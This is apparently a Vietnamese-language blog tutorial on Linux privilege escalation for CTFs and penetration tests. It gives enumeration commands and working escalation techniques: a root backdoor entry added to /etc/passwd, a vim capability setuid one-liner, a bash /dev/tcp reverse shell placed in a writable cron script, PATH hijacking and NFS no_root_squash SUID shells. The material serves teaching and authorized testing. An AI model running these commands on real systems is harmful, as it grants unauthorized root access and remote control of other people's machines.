---
title: "[Tutorial] Linux Privilege Escalation"
published: 2025-08-02
tags: [Linux, pentest, privesc]
category: Tutorial
description: A step-by-step tutorial on Linux Privilege Escalation techniques commonly found in CTFs and real-world scenarios. Learn how to enumerate, identify misconfigurations, and escalate privileges to root.
draft: false
image: /assets/data/linux.webp
---

## Enumeration
Liệt kê là bước đầu tiên bạn phải thực hiện khi đã truy cập được vào bất kỳ hệ thống nào. Bạn có thể đã truy cập hệ thống bằng cách khai thác một lỗ hổng nghiêm trọng dẫn đến quyền truy cập cấp root, hoặc chỉ đơn giản là tìm ra cách gửi lệnh bằng tài khoản có đặc quyền thấp. Không giống như các máy CTF, các cuộc kiểm tra xâm nhập không kết thúc khi bạn đã truy cập được vào một hệ thống hoặc cấp đặc quyền người dùng cụ thể. Như bạn sẽ thấy, việc liệt kê cũng quan trọng như nhau trong giai đoạn hậu xâm phạm như trước đó.

***1. Hostname***

Lệnh ```hostname``` sẽ trả về tên máy chủ của máy đích. Mặc dù giá trị này có thể dễ dàng thay đổi hoặc có một chuỗi tương đối vô nghĩa (ví dụ: Ubuntu-3487340239), trong một số trường hợp, nó có thể cung cấp thông tin về vai trò của hệ thống đích trong mạng doanh nghiệp (ví dụ: SQL-PROD-01 đối với máy chủ SQL sản xuất).

***2. uname -a***

Sẽ in thông tin hệ thống, cung cấp cho chúng tôi thêm chi tiết về kernel được hệ thống sử dụng. Điều này sẽ hữu ích khi tìm kiếm bất kỳ lỗ hổng kernel tiềm ẩn nào có thể dẫn đến leo thang đặc quyền

***3. /proc/version***

Hệ thống tệp proc (procfs) cung cấp thông tin về các tiến trình hệ thống đích. Bạn sẽ tìm thấy proc trên nhiều phiên bản Linux khác nhau, khiến nó trở thành một công cụ thiết yếu cần có trong kho vũ khí của bạn.

Việc xem xét ```/proc/version```có thể cung cấp cho bạn thông tin về phiên bản kernel và dữ liệu bổ sung như trình biên dịch (ví dụ: GCC) đã được cài đặt hay chưa

***4. /etc/issue***

Hệ thống cũng có thể được xác định bằng cách xem ```/etc/issue``` tệp. Tệp này thường chứa một số thông tin về hệ điều hành nhưng có thể dễ dàng tùy chỉnh hoặc thay đổi. Nhân tiện, bất kỳ tệp nào chứa thông tin hệ thống đều có thể được tùy chỉnh hoặc thay đổi. Để hiểu rõ hơn về hệ thống, việc xem xét tất cả những điều này luôn là một điều hữu ích.

***5. sudo -l***

Hệ thống đích có thể được cấu hình để cho phép người dùng chạy một số (hoặc tất cả) lệnh với quyền root. ```sudo -l``` Lệnh này có thể được sử dụng để liệt kê tất cả các lệnh mà người dùng của bạn có thể chạy bằng cách sử dụng ```sudo.```

***6. id***

Lệnh ```id``` này sẽ cung cấp tổng quan về cấp độ đặc quyền của người dùng và tư cách thành viên nhóm.

***7. /etc/passwd***

Đọc ```/etc/passwd``` tệp có thể là cách dễ dàng để khám phá người dùng trên hệ thống.

***8. find Command***

Việc tìm kiếm thông tin quan trọng và các vectơ leo thang đặc quyền tiềm ẩn trên hệ thống mục tiêu có thể mang lại hiệu quả. Lệnh "find" tích hợp rất hữu ích và đáng để bạn lưu lại.

Dưới đây là một số ví dụ hữu ích cho lệnh “find”.

``` find / -type f -name flag.txt 2>/dev/null```: Tìm tệp có tên flag.txt trong /

```find / -writable -type d 2>/dev/null```: Tìm các thư mục có thể ghi được 

```find / -type f -perm -4000 2>/dev/null``` Tìm các tệp có bit ```SUID```, cho phép chúng ta chạy tệp với mức đặc quyền cao hơn người dùng hiện tại. 


## Automated Enumeration Tools
Một số công cụ có thể giúp bạn tiết kiệm thời gian trong quá trình liệt kê. Những công cụ này chỉ nên được sử dụng để tiết kiệm thời gian, vì chúng có thể bỏ sót một số vector leo thang đặc quyền. Dưới đây là danh sách các công cụ liệt kê Linux phổ biến kèm theo liên kết đến kho lưu trữ Github tương ứng.

Môi trường của hệ thống đích sẽ ảnh hưởng đến công cụ bạn có thể sử dụng. Ví dụ, bạn sẽ không thể chạy một công cụ được viết bằng Python nếu nó chưa được cài đặt trên hệ thống đích. Vì vậy, tốt hơn hết là nên làm quen với một vài công cụ thay vì chỉ sử dụng một công cụ duy nhất.

- ***LinPeas*** : https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
- ***LinEnum***: https://github.com/rebootuser/LinEnum
- ***LES ( Linux Exploit Suggester)***: https://github.com/mzet-/linux-exploit-suggester
- ***Linux Smart Enumeration***: https://github.com/diego-treitos/linux-smart-enumeration
- ***Linux Priv Checker*** : https://github.com/linted/linuxprivchecker

## Privilege Escalation: Kernel Exploits
Việc leo thang đặc quyền lý tưởng nhất là dẫn đến quyền root. Điều này đôi khi có thể đạt được chỉ bằng cách khai thác lỗ hổng hiện có, hoặc trong một số trường hợp bằng cách truy cập vào tài khoản người dùng khác có nhiều đặc quyền, thông tin hoặc quyền truy cập hơn.



Trừ khi một lỗ hổng duy nhất dẫn đến root shell, quá trình leo thang đặc quyền sẽ dựa vào cấu hình sai và quyền hạn lỏng lẻo.



Nhân hệ thống Linux quản lý giao tiếp giữa các thành phần như bộ nhớ hệ thống và các ứng dụng. Chức năng quan trọng này yêu cầu nhân phải có các đặc quyền cụ thể; do đó, một cuộc tấn công thành công có thể dẫn đến quyền root.



Phương pháp khai thác Kernel rất đơn giản:

1. Xác định phiên bản hạt nhân
2. Tìm kiếm và tìm mã khai thác cho phiên bản hạt nhân của hệ thống mục tiêu
3. Chạy khai thác

Mặc dù trông có vẻ đơn giản, nhưng hãy nhớ rằng việc khai thác kernel thất bại có thể dẫn đến sập hệ thống. Hãy đảm bảo kết quả tiềm ẩn này nằm trong phạm vi kiểm tra thâm nhập của bạn trước khi thử khai thác kernel.


## Privilege Escalation: Sudo
Lệnh sudo, theo mặc định, cho phép bạn chạy chương trình với quyền root. Trong một số trường hợp, quản trị viên hệ thống có thể cần cung cấp cho người dùng thông thường một số quyền linh hoạt. Ví dụ: một chuyên viên phân tích SOC cấp cơ sở có thể cần sử dụng Nmap thường xuyên nhưng sẽ không được cấp quyền root đầy đủ. Trong trường hợp này, quản trị viên hệ thống có thể cho phép người dùng này chỉ chạy Nmap với quyền root trong khi vẫn giữ nguyên mức quyền thông thường của mình trong toàn bộ phần còn lại của hệ thống.

Bất kỳ người dùng nào cũng có thể kiểm tra tình hình hiện tại liên quan đến quyền root bằng lệnh ```sudo -l```

https://gtfobins.github.io/ là một nguồn thông tin giá trị về cách sử dụng bất kỳ chương trình nào mà bạn có quyền sudo.

## Privilege Escalation: SUID
Phần lớn các quyền kiểm soát đặc quyền của Linux dựa trên việc kiểm soát tương tác giữa người dùng và tệp. Điều này được thực hiện thông qua quyền. Đến đây, bạn đã biết rằng tệp có thể có các quyền đọc, ghi và thực thi. Các quyền này được cấp cho người dùng trong phạm vi quyền hạn của họ. Điều này thay đổi với SUID (Thiết lập Nhận dạng Người dùng) và SGID (Thiết lập Nhận dạng Nhóm). Các quyền này cho phép tệp được thực thi với cấp quyền tương ứng của chủ sở hữu tệp hoặc chủ sở hữu nhóm.

Bạn sẽ thấy các tệp này có bit "s" được đặt để hiển thị cấp quyền đặc biệt của chúng.

```find / -type f -perm -04000 -ls 2>/dev/null``` sẽ liệt kê các tệp đã được đặt bit SUID hoặc SGID.
Một cách thực hành tốt là so sánh các tệp thực thi trong danh sách này với GTFOBins ( https://gtfobins.github.io ).

Nhấp vào nút SUID sẽ lọc các tệp nhị phân được biết là có thể khai thác khi bit SUID được đặt (bạn cũng có thể sử dụng liên kết này để xem danh sách đã lọc trước  https://gtfobins.github.io/#+suid ).

Một ví dụ đơn giản:

Bit SUID được thiết lập cho trình soạn thảo văn bản nano cho phép chúng ta tạo, chỉnh sửa và đọc tệp bằng đặc quyền của chủ sở hữu tệp. Nano thuộc sở hữu của root, điều này có thể có nghĩa là chúng ta có thể đọc và chỉnh sửa tệp ở cấp đặc quyền cao hơn so với người dùng hiện tại. Ở giai đoạn này, chúng ta có thể thêm người dùng vào ```/etc/passwd.``` để leo thang đặc quyền 

Chúng ta sẽ cần giá trị băm của mật khẩu mà chúng ta muốn người dùng mới có. Việc này có thể được thực hiện nhanh chóng bằng công cụ ```openssl``` trên Kali Linux .

```
openssl passwd -1 -salt Minh password1
$1$Minh$texgrE2hEOdd6UFBvzYdj.
```
Sau đó thêm vào tệp ```/etc/passwd``` dạng

```
hacker:$1$Minh$texgrE2hEOdd6UFBvzYdj.:0:0:root:/root:/bin/bash
```

Vậy là chúng ta đã có user ```hacker``` với quyền ```root```


## Privilege Escalation: Capabilities
Một phương pháp khác mà quản trị viên hệ thống có thể sử dụng để tăng cấp đặc quyền của một tiến trình hoặc tệp nhị phân là ```Capabilities```. Khả năng giúp quản lý đặc quyền ở cấp độ chi tiết hơn. Ví dụ: nếu nhà phân tích SOC cần sử dụng một công cụ cần khởi tạo kết nối socket, người dùng thông thường sẽ không thể thực hiện việc đó. Nếu quản trị viên hệ thống không muốn cấp cho người dùng này đặc quyền cao hơn, họ có thể thay đổi các khả năng của tệp nhị phân. Kết quả là, tệp nhị phân sẽ hoàn thành tác vụ của nó mà không cần người dùng có đặc quyền cao hơn.

chúng ta có thể sử dụng ```getcap``` công cụ để liệt kê các khả năng đã được kích hoạt.

```getcap -r / 2>/dev/null```

```GTFObins``` có một danh sách các tệp nhị phân hữu ích có thể được sử dụng để leo thang đặc quyền nếu chúng tôi tìm thấy bất kỳ khả năng nào được thiết lập.

Ví dụ lệnh ```vim = cap_setuid+ep``` ta có thể dùng câu lênh này để leo thang đặc quyền

```
./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```
## Privilege Escalation: Cron Jobs
Cron job được sử dụng để chạy các tập lệnh hoặc tệp nhị phân tại những thời điểm cụ thể. Theo mặc định, chúng chạy với đặc quyền của chủ sở hữu chứ không phải người dùng hiện tại. Mặc dù các cron job được cấu hình đúng cách về cơ bản không dễ bị tấn công, nhưng chúng có thể cung cấp một vectơ leo thang đặc quyền trong một số điều kiện.
Ý tưởng khá đơn giản; nếu có một tác vụ được lên lịch chạy với đặc quyền root và chúng ta có thể thay đổi tập lệnh sẽ được chạy, thì tập lệnh của chúng ta sẽ chạy với đặc quyền root.

Cấu hình cron job được lưu trữ dưới dạng crontab (bảng cron) để xem thời gian và ngày tháng tiếp theo mà tác vụ sẽ chạy.

Mỗi người dùng trên hệ thống đều có tệp crontab riêng và có thể chạy các tác vụ cụ thể cho dù họ có đăng nhập hay không. Như bạn có thể mong đợi, mục tiêu của chúng ta sẽ là tìm một cron job do root thiết lập và để nó chạy tập lệnh của chúng ta, lý tưởng nhất là một shell.

Bất kỳ người dùng nào cũng có thể đọc tệp này và giữ các cron job trên toàn hệ thống trong ```/etc/crontab```

Mặc dù các máy CTF có thể chạy cron job mỗi phút hoặc mỗi 5 phút, nhưng bạn sẽ thường thấy các tác vụ chạy hàng ngày, hàng tuần hoặc hàng tháng trong các đợt kiểm tra thâm nhập.

Ví dụ tệp ```backup.sh``` tập lệnh đã được cấu hình để chạy mỗi phút. Nội dung của tệp hiển thị một tập lệnh đơn giản tạo bản sao lưu của tệp prices.xls.

Vì người dùng hiện tại của chúng ta có thể truy cập tập lệnh này, chúng ta có thể dễ dàng sửa đổi nó để tạo một reverse shell, hy vọng là với quyền root.

Tập lệnh sẽ sử dụng các công cụ có sẵn trên hệ thống đích để khởi chạy reverse shell.

```
#!/bin/bash
bash -i >& /dev/tcp/IP/PORT/ 0>&1
```
Bây giờ chúng ta sẽ chạy trình lắng nghe trên máy tấn công để nhận kết nối đến.

```
nc -nlvp PORT
```

Luôn nên kiểm tra Crontab vì đôi khi nó có thể dễ dàng dẫn đến việc leo thang đặc quyền. Tình huống sau đây không hiếm gặp ở những công ty chưa đạt được mức độ trưởng thành nhất định về an ninh mạng:

1. Người quản trị hệ thống cần chạy tập lệnh theo định kỳ.
2. Họ tạo một công việc cron để làm điều này
3. Sau một thời gian, tập lệnh trở nên vô dụng và họ xóa nó
4. Họ không dọn dẹp công việc cron có liên quan

Vấn đề quản lý thay đổi này dẫn đến khả năng khai thác các tác vụ cron. Mặc dù tệp đã bị xóa nhưng kẻ tấn công vẫn có thể giả mạo tệp là một reverse shell để leo thang đặc quyền

## Privilege Escalation: PATH
Nếu một thư mục mà người dùng của bạn có quyền ghi nằm trong đường dẫn, bạn có thể chiếm quyền điều khiển ứng dụng để chạy một tập lệnh. PATH trong Linux là một biến môi trường cho hệ điều hành biết nơi tìm kiếm các tệp thực thi. Đối với bất kỳ lệnh nào không được tích hợp sẵn trong shell hoặc không được định nghĩa bằng đường dẫn tuyệt đối, Linux sẽ bắt đầu tìm kiếm trong các thư mục được định nghĩa trong PATH. (PATH là biến môi trường chúng ta đang nói đến ở đây, path là vị trí của tệp).

Thông thường, PATH sẽ trông như thế này:
```
home/minhtuan/.local/bin:/usr/share/pyenv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
```
Nếu chúng ta nhập ```hack``` vào dòng lệnh, đây là những vị trí mà Linux sẽ tìm kiếm một tệp thực thi có tên là ```hack```. Kịch bản bên dưới sẽ cho bạn hiểu rõ hơn về cách tận dụng điều này để tăng mức đặc quyền. Như bạn sẽ thấy, điều này hoàn toàn phụ thuộc vào cấu hình hiện có của hệ thống đích, vì vậy hãy đảm bảo bạn có thể trả lời các câu hỏi bên dưới trước khi thử.

1. Những thư mục nào nằm trong $PATH
2. Người dùng hiện tại của bạn có quyền ghi vào bất kỳ thư mục nào trong số này không?
3. Bạn có thể sửa đổi $PATH không?
4. Có tập lệnh/ứng dụng nào bạn có thể khởi chạy mà bị ảnh hưởng bởi lỗ hổng bảo mật này không?

```C++
#include<unistd.h>
int main()
{
    setuid(0);
    setgid(0);
    system("hack");
    return 0
}
```
Tập lệnh này cố gắng khởi chạy một hệ thống nhị phân có tên là ```hack``` nhưng ví dụ này có thể dễ dàng được sao chép bằng bất kỳ hệ thống nhị phân nào.

Chúng tôi biên dịch nó thành một tệp thực thi và thiết lập bit SUID.
```
gcc hack.c -o path -w
```
Sau khi thực thi, ```path```  sẽ tìm kiếm tệp thực thi có tên ```hack``` bên trong các thư mục được liệt kê trong PATH.

Nếu bất kỳ thư mục nào có thể ghi được liệt kê trong PATH, chúng ta có thể tạo một tệp nhị phân có tên là ```hack``` trong thư mục đó và chạy tập lệnh ```path```. Khi bit SUID được thiết lập, tệp nhị phân này sẽ chạy với quyền root.

Chúng ta có thể dùng ```find``` để liệt kê các thư mục có quyền ghi vào

```
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
```
Rồi thêm nó vào PATH
```
export PATH=/tmp:$PATH
```

Tại thời điểm này, tập lệnh đường dẫn cũng sẽ tìm kiếm tệp thực thi có tên ```hack``` trong thư mục /tmp.

Việc tạo lệnh này khá dễ dàng bằng cách sao chép /bin/bash thành ```hack``` trong thư mục /tmp.

## Privilege Escalation: NFS
Các vectơ leo thang đặc quyền không chỉ giới hạn ở quyền truy cập nội bộ. Các thư mục dùng chung và giao diện quản lý từ xa như SSH và Telnet cũng có thể giúp bạn giành được quyền truy cập root trên hệ thống mục tiêu. Một số trường hợp cũng yêu cầu sử dụng cả hai vectơ, ví dụ: tìm khóa riêng SSH root trên hệ thống mục tiêu và kết nối qua SSH với quyền root thay vì cố gắng tăng cấp đặc quyền của người dùng hiện tại.

Một vectơ khác liên quan nhiều hơn đến CTF và các kỳ thi là shell mạng được cấu hình sai. Đôi khi, vectơ này có thể được phát hiện trong các cuộc kiểm tra thâm nhập khi có hệ thống sao lưu mạng.

Cấu hình NFS (Chia sẻ Tệp Mạng) được lưu trong tệp ```/etc/exports```. Tệp này được tạo trong quá trình cài đặt máy chủ NFS và người dùng thường có thể đọc được.

Yếu tố quan trọng cho vector leo thang đặc quyền này là tùy chọn ```no_root_squash``` mà bạn có thể thấy ở trên. Theo mặc định, NFS sẽ thay đổi người dùng root thành nfsnobody và loại bỏ bất kỳ tệp nào khỏi quyền root. Nếu tùy chọn ```no_root_squash``` có trên một chia sẻ có thể ghi, chúng ta có thể tạo một tệp thực thi với bit SUID được thiết lập và chạy nó trên hệ thống mục tiêu.

Chúng ta sẽ bắt đầu bằng cách liệt kê các chia sẻ có thể gắn kết từ máy tấn công của mình.

```
showmount -e HOST
```
Chúng ta sẽ gắn một trong các chia sẻ ```no_root_squash``` vào máy tấn công của mình và bắt đầu xây dựng tệp thực thi.

```
mkdir /tmp/backupclient

mount -o rw HOST: backup /tmp/backupclient
```

Xây dựng tệp thực thi
```C++
#include<unistd.h>
int main()
{
    setuid(0);
    setgid(0);
    system("/bin/bash");
    return 0
}
```
Sau khi biên dịch và thiết lập bit SUID thì trên máy mục tiêu cũng có tệp này với quyền tương tự

```
gcc nfs.c -o nfs -w
chmod +s nfs
```



Một thủ thuật nhỏ hậu khai thác là có thể sử dụng câu lệnh

```python 
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
Nó được dùng để nâng cấp shell thô (raw shell) thành một shell tương tác (interactive shell) hơn trong môi trường CTF, reverse shell hoặc post-exploitation.

